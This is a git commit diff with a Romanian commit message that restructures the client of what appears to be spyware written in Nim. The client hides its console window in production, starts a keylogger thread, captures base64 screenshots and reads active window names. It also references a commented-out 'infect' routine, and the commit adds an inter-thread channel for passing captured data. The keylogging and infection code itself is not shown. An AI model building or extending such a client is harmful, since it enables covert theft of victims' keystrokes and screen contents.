0e69af0c3dd48070ae37839d4ea67b8c197563d3
vieru <mixerandr3w001@gmail.com>
2020-07-30 18:46:19 +0300

    am adaugat support basic pt mesaje intre threaduri

--- src/client.nim
+++ src/client.nim
@@ -1,19 +1,20 @@
-# hide the console window
-const isProd {.booldefine.}: bool = false
-
+import asyncdispatch
+import lib/threads/keyloggerThread
+import lib/functions/getWindowName
+import lib/functions/screenshot
+from lib/channels import mainThread
 
 # am pus asta doar ca sa testez func
 # import lib/functions/infect
 # infect()
 
+# hide the console window
+const isProd {.booldefine.}: bool = false
+
 when isProd:
   from lib/functions/beforeStart import run
   run()
 
-import asyncdispatch
-import lib/threads/keyloggerThread
-import lib/functions/getWindowName
-import lib/functions/screenshot
 let base64Ss: string = screenshot()
 
 # writeFile("base64.tmp.txt", base64Ss)
@@ -22,14 +23,22 @@ let base64Ss: string = screenshot()
 ## TODO: COMUNICARE INTRE THREADURI
 var thr: Thread[void]
 
+open mainThread
+
 createThread(thr, initKeyloggerThread)
 
-proc main() {.async.} =
-  echo getWindowName()
-  await sleepAsync(1000)
-  asyncCheck main()
+while true:
+  let channel = mainThread.tryRecv()
 
-asyncCheck main()
+  if channel.dataAvailable:
+    echo channel.msg
 
-runForever()
+# proc main() {.async.} =
+#   echo getWindowName()
+#   await sleepAsync(1000)
+#   asyncCheck main()
+
+# asyncCheck main()
+
+# runForever()
 
---
+++ src/lib/channels.nim
@@ -0,0 +1,1 @@
+var mainThread*: Channel[string]
